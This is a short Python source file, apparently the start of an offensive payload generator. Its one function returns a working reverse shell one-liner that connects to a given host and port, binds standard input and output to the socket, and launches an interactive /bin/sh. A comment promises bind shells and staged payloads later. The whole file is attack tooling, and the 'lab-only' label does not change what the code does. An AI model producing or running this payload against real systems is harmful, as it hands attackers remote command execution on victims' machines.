# payloads.py
import socket
import subprocess

def generate_reverse_shell(lhost: str, lport: int) -> str:
    """Return multi-platform Python reverse shell one-liner (lab-only)"""
    payload = f'''
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{lhost}",{lport}));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"])
'''
    return payload.strip()

# Add more generators later: bind shells, staged, etc.